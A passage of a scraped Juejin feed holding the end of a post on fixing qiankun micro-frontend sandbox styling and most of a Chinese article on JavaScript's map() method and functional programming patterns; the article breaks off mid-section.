<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">domContainer</span> = props.container.querySelector(<span class="hljs-string">'#root'</span>)
</code></pre>
<p>→ 但 <code>props.container</code> <strong>是 qiankun 创建的沙箱 div</strong> → 它内部 <strong>没有</strong> <code>#root</code> <strong>元素！</strong></p>
<p>所以你实际渲染到了 <strong>主文档的</strong> <code>#root</code>（如果存在），或者渲染失败。</p>
<p>而 css 规则被重写为</p>
<pre><code class="hljs language-csharp" lang="csharp">[<span class="hljs-meta">data-qiankun=<span class="hljs-string">"myReactDemo"</span></span>] .some-<span class="hljs-keyword">class</span> { ... }
</code></pre>
<p>但你的 DOM 不在 <code>[data-qiankun=...]</code> 内部 → 样式不匹配 → <strong>看起来没样式</strong></p>
<h4 data-id="heading-56">解决方案</h4>
<p>在子应用的 mount 函数中，重新创建节点，塞一个div#root的节点</p>
<pre><code class="hljs language-ini" lang="ini">function async mount(props) {
  let <span class="hljs-attr">container</span> = props.container<span class="hljs-comment">;</span>

      // 如果容器内没有 <span class="hljs-comment">#root，就创建一个</span>
      if (!container.querySelector('<span class="hljs-comment">#root')) {</span>
        const <span class="hljs-attr">rootEl</span> = document.createElement(<span class="hljs-string">'div'</span>)<span class="hljs-comment">;</span>
        <span class="hljs-attr">rootEl.id</span> = <span class="hljs-string">'root'</span><span class="hljs-comment">;</span>
        container.appendChild(rootEl)<span class="hljs-comment">;</span>
      }

      const <span class="hljs-attr">domContainer</span> = container.querySelector(<span class="hljs-string">'#root'</span>)!<span class="hljs-comment">;</span>
      const <span class="hljs-attr">root</span> = ReactDOM.createRoot(domContainer)<span class="hljs-comment">;</span>
      root.render(&lt;App /&gt;)<span class="hljs-comment">;</span>
}
</code></pre>
<p>这样的DOM结构就被更改为</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"container"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">data-qiankun</span>=<span class="hljs-string">"myReactDemo"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"root"</span>&gt;</span> <span class="hljs-comment">&lt;!-- 你的 App 在这里 --&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p>而css被重写为</p>
<pre><code class="hljs language-csharp" lang="csharp">[<span class="hljs-meta">data-qiankun=<span class="hljs-string">"myReactDemo"</span></span>] .header { ... }
</code></pre></strong></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JavaScript map() 方法：从工具到编程哲学的升华]]></title>    <link>https://juejin.cn/post/7575910298282655779</link>    <guid>https://juejin.cn/post/7575910298282655779</guid>    <pubDate>2025-11-24T07:40:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575910298282655779" data-draft-id="7575910298282606627" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JavaScript map() 方法：从工具到编程哲学的升华"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2025-11-24T07:40:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="新晨437"/> <meta itemprop="url" content="https://juejin.cn/user/3957868231143133"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JavaScript map() 方法：从工具到编程哲学的升华
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3957868231143133/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    新晨437
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T07:40:42.000Z" title="Mon Nov 24 2025 07:40:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">JavaScript map() 方法：从工具到编程哲学的升华</h2>
<p>在 JavaScript 的世界里，有些方法不仅仅是工具，更是编程思想的载体。<code>map()</code> 就是这样一个方法——它表面上是一个简单的数组转换方法，实质上却代表了函数式编程的核心思想。</p>
<h3 data-id="heading-1">什么是 map()？重新审视这个"简单"的方法</h3>
<p>大多数开发者对 <code>map()</code> 的基本认知停留在"遍历数组并返回新数组"的层面：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> numbers = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];
<span class="hljs-keyword">const</span> doubled = numbers.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> x * <span class="hljs-number">2</span>);
<span class="hljs-comment">// [2, 4, 6]</span>
</code></pre>
<p>但如果我们深入思考，<code>map()</code> 的本质是什么？</p>
<p><strong>map() 是一个转换器，一个投影函数，一个将领域 A 映射到领域 B 的桥梁。</strong></p>
<h3 data-id="heading-2">数学根源：范畴论中的映射</h3>
<p>从数学角度看，<code>map()</code> 源于范畴论中的态射（morphism）概念。在范畴论中，映射保持结构不变，只是将元素从一个集合转换到另一个集合。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 数学上的映射：f: X → Y</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">f</span> = x =&gt; x * <span class="hljs-number">2</span>;
<span class="hljs-keyword">const</span> X = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];
<span class="hljs-keyword">const</span> Y = X.<span class="hljs-title function_">map</span>(f); <span class="hljs-comment">// [2, 4, 6]</span>
</code></pre>
<p>这种数学背景赋予了 <code>map()</code> 一些重要特性：</p>
<ul>
<li><strong>确定性</strong>：相同的输入总是产生相同的输出</li>
<li><strong>无副作用</strong>：不改变原始数据</li>
<li><strong>结构保持</strong>：数组长度和顺序保持不变</li>
</ul>
<h3 data-id="heading-3">函数式编程的基石</h3>
<h4 data-id="heading-4">纯函数与不可变性</h4>
<p><code>map()</code> 鼓励我们编写纯函数，这是函数式编程的核心原则：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 不纯的做法（避免）</span>
<span class="hljs-keyword">const</span> users = [{ <span class="hljs-attr">name</span>: <span class="hljs-string">'Alice'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">25</span> }];
<span class="hljs-keyword">let</span> nextId = <span class="hljs-number">1</span>;

users.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">user</span> =&gt;</span> {
  user.<span class="hljs-property">id</span> = nextId++; <span class="hljs-comment">// 副作用：修改原对象</span>
  <span class="hljs-keyword">return</span> user;
});

<span class="hljs-comment">// 纯函数做法（推荐）</span>
<span class="hljs-keyword">const</span> usersWithId = users.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">user, index</span>) =&gt;</span> ({
  ...user,
  <span class="hljs-attr">id</span>: index + <span class="hljs-number">1</span>  <span class="hljs-comment">// 无副作用，创建新对象</span>
}));
</code></pre>
<h4 data-id="heading-5">声明式编程范式</h4>
<p>对比命令式和声明式编程，<code>map()</code> 的优势显而易见：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 命令式（怎么做）</span>
<span class="hljs-keyword">const</span> doubled = [];
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; numbers.<span class="hljs-property">length</span>; i++) {
  doubled.<span class="hljs-title function_">push</span>(numbers[i] * <span class="hljs-number">2</span>);
}

<span class="hljs-comment">// 声明式（做什么）</span>
<span class="hljs-keyword">const</span> doubled = numbers.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">n</span> =&gt;</span> n * <span class="hljs-number">2</span>);
</code></pre>
<p>声明式代码更简洁、更易读、更易维护，因为它隐藏了实现细节，专注于业务逻辑。</p>
<h3 data-id="heading-6">超越基础：map() 的高级应用</h3>
<h4 data-id="heading-7">1. 函数组合与管道</h4>
<p><code>map()</code> 天然支持函数组合，可以构建复杂的数据转换管道：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">compose</span> = (<span class="hljs-params">...fns</span>) =&gt; <span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> fns.<span class="hljs-title function_">reduceRight</span>(<span class="hljs-function">(<span class="hljs-params">v, f</span>) =&gt;</span> <span class="hljs-title function_">f</span>(v), x);
<span class="hljs-keyword">const</span> <span class="hljs-title function_">pipe</span> = (<span class="hljs-params">...fns</span>) =&gt; <span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> fns.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">v, f</span>) =&gt;</span> <span class="hljs-title function_">f</span>(v), x);

<span class="hljs-keyword">const</span> users = [
  { <span class="hljs-attr">name</span>: <span class="hljs-string">'alice'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">25</span>, <span class="hljs-attr">salary</span>: <span class="hljs-number">50000</span> },
  { <span class="hljs-attr">name</span>: <span class="hljs-string">'bob'</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">30</span>, <span class="hljs-attr">salary</span>: <span class="hljs-number">60000</span> }
];

<span class="hljs-comment">// 组合多个转换函数</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">capitalize</span> = str =&gt; str.<span class="hljs-title function_">charAt</span>(<span class="hljs-number">0</span>).<span class="hljs-title function_">toUpperCase</span>() + str.<span class="hljs-title function_">slice</span>(<span class="hljs-number">1</span>);
<span class="hljs-keyword">const</span> <span class="hljs-title function_">addBonus</span> = user =&gt; ({ ...user, <span class="hljs-attr">salary</span>: user.<span class="hljs-property">salary</span> * <span class="hljs-number">1.1</span> });
<span class="hljs-keyword">const</span> <span class="hljs-title function_">formatForDisplay</span> = user =&gt; <span class="hljs-string">`<span class="hljs-subst">${user.name}</span>: $<span class="hljs-subst">${user.salary}</span>`</span>;

<span class="hljs-keyword">const</span> processUsers = users.<span class="hljs-title function_">map</span>(
  <span class="hljs-title function_">pipe</span>(
    addBonus,
    <span class="hljs-function"><span class="hljs-params">user</span> =&gt;</span> ({ ...user, <span class="hljs-attr">name</span>: <span class="hljs-title function_">capitalize</span>(user.<span class="hljs-property">name</span>) }),
    formatForDisplay
  )
);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(processUsers);
<span class="hljs-comment">// ['Alice: $55000', 'Bob: $66000']</span>
</code></pre>
<h4 data-id="heading-8">2. 异步编程模式</h4>
<p>虽然 <code>map()</code> 本身是同步的，但可以与异步编程模式结合：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 与 Promise 结合</span>
<span class="hljs-keyword">const</span> urls = [<span class="hljs-string">'/api/user/1'</span>, <span class="hljs-string">'/api/user/2'</span>, <span class="hljs-string">'/api/user/3'</span>];

<span class="hljs-comment">// 顺序执行</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">sequentialFetch</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">urls</span>) =&gt; {
  <span class="hljs-keyword">const</span> results = [];
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> url <span class="hljs-keyword">of</span> urls) {
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(url);
    results.<span class="hljs-title function_">push</span>(<span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>());
  }
  <span class="hljs-keyword">return</span> results;
};

<span class="hljs-comment">// 并行执行（使用 Promise.all）</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">parallelFetch</span> = (<span class="hljs-params">urls</span>) =&gt; {
  <span class="hljs-keyword">return</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>(
    urls.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">url</span> =&gt;</span> 
      <span class="hljs-title function_">fetch</span>(url).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response.<span class="hljs-title function_">json</span>())
    )
  );
};
</code></pre>
<h4 data-id="heading-9">3.  transducer 模式</h4>
<p>对于大数据集，避免中间数组的创建可以显著提升性能：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 传统方式（创建中间数组）</span>
<span class="hljs-keyword">const</span> bigData = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>({ <span class="hljs-attr">length</span>: <span class="hljs-number">1000000</span> }, <span class="hljs-function">(<span class="hljs-params">_, i</span>) =&gt;</span> i);
<span class="hljs-keyword">const</span> result = bigData
  .<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> x % <span class="hljs-number">2</span> === <span class="hljs-number">0</span>)    <span class="hljs-comment">// 创建中间数组</span>
  .<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> x * <span class="hljs-number">2</span>)             <span class="hljs-comment">// 创建中间数组</span>
  .<span class="hljs-title function_">slice</span>(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>);               <span class="hljs-comment">// 创建中间数组</span>

<span class="hljs-comment">// transducer 风格（单次遍历）</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">transduce</span> = (<span class="hljs-params">transducer, reducer, initial, data</span>) =&gt; {
  <span class="hljs-keyword">const</span> transform = <span class="hljs-title function_">transducer</span>(reducer);
  <span class="hljs-keyword">return</span> data.<span class="hljs-title function_">reduce</span>(transform, initial);
};

<span class="hljs-keyword">const</span> <span class="hljs-title function_">mapping</span> = f =&gt; <span class="hljs-function"><span class="hljs-params">reducer</span> =&gt;</span> <span class="hljs-function">(<span class="hljs-params">acc, val</span>) =&gt;</span> <span class="hljs-title function_">reducer</span>(acc, <span class="hljs-title function_">f</span>(val));
<span class="hljs-keyword">const</span> <span class="hljs-title function_">filtering</span> = pred =&gt; <span class="hljs-function"><span class="hljs-params">reducer</span> =&gt;</span> <span class="hljs-function">(<span class="hljs-params">acc, val</span>) =&gt;</span> 
  <span class="hljs-title function_">pred</span>(val) ? <span class="hljs-title function_">reducer</span>(acc, val) : acc;

<span class="hljs-keyword">const</span> xform = <span class="hljs-title function_">compose</span>(
  <span class="hljs-title function_">filtering</span>(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> x % <span class="hljs-number">2</span> === <span class="hljs-number">0</span>),
  <span class="hljs-title function_">mapping</span>(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> x * <span class="hljs-number">2</span>)
);

<span class="hljs-keyword">const</span> result = <span class="hljs-title function_">transduce</span>(xform, <span class="hljs-function">(<span class="hljs-params">acc, val</span>) =&gt;</span> {
  <span class="hljs-keyword">if</span> (acc.<span class="hljs-property">length</span> &lt; <span class="hljs-number">10</span>) acc.<span class="hljs-title function_">push</span>(val);
  <span class="hljs-keyword">return</span> acc;
}, [], bigData);
</code></pre>
<h3 data-id="heading-10">现实世界的应用模式</h3>
<h4 data-id="heading-11">数据规范化</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// API 响应数据规范化</span>
<span class="hljs-keyword">const</span> apiResponse = {
  <span class="hljs-attr">users</span>: [
    { <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">attributes</span>: { <span class="hljs-attr">name</span>: <span class="hljs-string">'Alice'</span>, <span class="hljs-attr">email</span>: <span class="hljs-string">'alice@example.com'</span> } },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">attributes</span>: { <span class="hljs-attr">name</span>: <span class="hljs-string">'Bob'</span>, <span class="hljs-attr">email</span>: <span class="hljs-string">'bob@example.com'</span> } }
  ]
};

<span class="hljs-comment">// 创建查找表</span>
<span class="hljs-keyword">const</span> usersById = apiResponse.<span class="hljs-property">users</span>.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">acc, user</span>) =&gt;</span> {
  acc[user.<span class="hljs-property">id</span>] = {
    <span class="hljs-attr">id</span>: user.<span class="hljs-property">id</span>,
    ...user.<span class="hljs-property">attributes</span>
  };
  <span class="hljs-keyword">return</span> acc;
}, {});

<span class="hljs-comment">// 创建ID数组</span>
<span class="hljs-keyword">const</span> userIds = apiResponse.<span class="hljs-property">users</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">user</span> =&gt;</span> user.<span class="hljs-property">id</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(usersById);
<span class="hljs-comment">// { </span>
<span class="hljs-comment">//   1: { id: 1, name: 'Alice', email: 'alice@example.com' },</span>
<span class="hljs-comment">//   2: { id: 2, name: 'Bob', email: 'bob@example.com' }</span>
<span class="hljs-comment">// }</span>

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(userIds); <span class="hljs-comment">// [1, 2]</span>
</code></pre>
<h4 data-id="heading-12">状态管理</h4>
<p>在 Redux 等状态管理中，<code>map()</code> 是不可变更新的核心：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Redux reducer</span>
<span class="hljs-keyword">const</span> initialState = {
  <span class="hljs-attr">todos</span>: [
    { <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">text</span>: <span class="hljs-string">'Learn JavaScript'</span>, <span class="hljs-attr">completed</span>: <span class="hljs-literal">false</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">text</span>: <span class="hljs-string">'Build something'</span>, <span class="hljs-attr">completed</span>: <span class="hljs-literal">true</span> }
  ]
};

<span class="hljs-keyword">const</span> <span class="hljs-title function_">todoReducer</span> = (<span class="hljs-params">state = initialState, action</span>) =&gt; {
  <span class="hljs-keyword">switch</span> (action.<span class="hljs-property">type</span>) {
    <span class="hljs-keyword">case</span> <span class="hljs-string">'TOGGLE_TODO'</span>:
      <span class="hljs-keyword">return</span> {
        ...state,
        <span class="hljs-attr">todos</span>: state.<span class="hljs-property">todos</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">todo</span> =&gt;</span>
          todo.<span class="hljs-property">id</span> === action.<span class="hljs-property">id</span>
            ? { ...todo, <span class="hljs-attr">completed</span>: !todo.<span class="hljs-property">completed</span> }
            : todo
        )
      };
    <span class="hljs-attr">default</span>:
      <span class="hljs-keyword">return</span> state;
  }
};
</code></pre>
<h3 data-id="heading-13">性能考量与最佳实践</h3>
<h4 data-id="heading-14">1. 避免在 map() 中产生副作用</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ❌ 不良实践</span>
<span class="hljs-keyword">const</span> results = items.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> {
  <span class="hljs-title function_">saveToDatabase</span>(item); <span class="hljs-comment">// 副作用</span>
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">process</span>(item);
});

<span class="hljs-comment">// ✅ 良好实践</span>
<span class="hljs-keyword">const</span> processedItems = items.<span class="hljs-title function_">map</span>(process);
processedItems.<span class="hljs-title function_">forEach</span>(saveToDatabase); <span class="hljs-comment">// 副作用分离</span>
</code></pre>
<h4 data-id="heading-15">2. 适时使用 for 循环</h4>
<p>对于性能敏感的场景，传统的 for 循环可能更合适：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 对于超大型数组</span>
<span class="hljs-keyword">const</span> hugeArray = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>({ <span class="hljs-attr">length</span>: <span class="hljs-number">1000000</span> }, <span class="hljs-function">(<span class="hljs-params">_, i</span>) =&gt;</span> i);

<span class="hljs-comment">// map() - 函数调用开销</span>
<span class="hljs-keyword">const</span> result1 = hugeArray.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> x * <span class="hljs-number">2</span>);

<span class="hljs-comment">// for 循环 - 更好的性能</span>
<span class="hljs-keyword">const</span> result2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(hugeArray.<span class="hljs-property">length</span>);
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; hugeArray.<span class="hljs-property">length</span>; i++) {
  result2[i] = hugeArray[i] * <span class="hljs-number">2</span>;
}
</code></pre>
<h4 data-id="heading-16">3. 利用惰性求值</h4>
<p>对于需要提前退出的场景，考虑使用生成器：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span>* <span class="hljs-title function_">transformWithLimit</span>(<span class="hljs-params">array, transform, limit</span>) {
  <span class="hljs-keyword">let</span> count = <span class="hljs-number">0</span>;
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> item <span class="hljs-keyword">of</span> array) {
    <span class="hljs-keyword">if</span> (count &gt;= limit) <span class="hljs-keyword">return</span>;
    <span class="hljs-keyword">yield</span> <span class="hljs-title function_">transform</span>(item);
    count++;
  }
}

<span class="hljs-keyword">const</span> numbers = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>];
<span class="hljs-keyword">const</span> limitedTransform = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(
  <span class="hljs-title function_">transformWithLimit</span>(numbers, <span class="hljs-function"><span class="hljs-params">x</span> =&gt;</span> x * <span class="hljs-number">2</span>, <span class="hljs-number">3</span>)
);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(limitedTransform); <span class="hljs-comment">// [2, 4, 6]</span>
</code></pre>
<h3 data-id="heading-17">map() 的哲学意义</h3>
<h4 data-id="heading-18">数据转换思维</h4>
<p><code>map()</code> 教会我们以数据转换的视角看待编程。我们不再关注"如何循环"，而是关注"如何转换"。这种思维转变影响深远：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 传统思维：关注过程</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">processUsers</span>(<span class="hljs-params">users</span>) {
  <span class="hljs-keyword">const</span> result = [];
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; users.<span class="hljs-property">length</span>; i++) {
    <span class="hljs-keyword">if</span> (users[i].<span class="hljs-property">active</span>) {
      result.<span class="hljs-title function_">push</span>({
        <span class="hljs-attr">name</span>: users[i].<span class="hljs-property">name</span>.<span class="hljs-title function_">toUpperCase</span>(),
        <span class="hljs-attr">age</span>: users[i].<span class="hljs-property">age</span> + <span class="hljs-number">1</span>
      });
    }
  }
  <span class="hljs-keyword">return</span> result;
}

<span class="hljs-comment">// 转换思维：关注数据流</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">processUsers</span> = users =&gt; users
  .<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">user</span> =&gt;</span> user.<span class="hljs-property">active</span>)
  .<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">user</span> =&gt;</span> ({
    <span class="hljs-attr">name</span>: user.<span class="hljs-property">name</span>.<span class="hljs-title function_">toUpperCase</span>(),
    <span class="hljs-attr">age</span>: user.<span class="hljs-property">age</span> + <span class="hljs-number">1</span>
  }));
</code></pre>
<h4 data-id="heading-19">抽象与组合</h4>
<p><code>map()</code> 是抽象思维的完美体现。它让我们能够构建可复用的转换单元：</p>
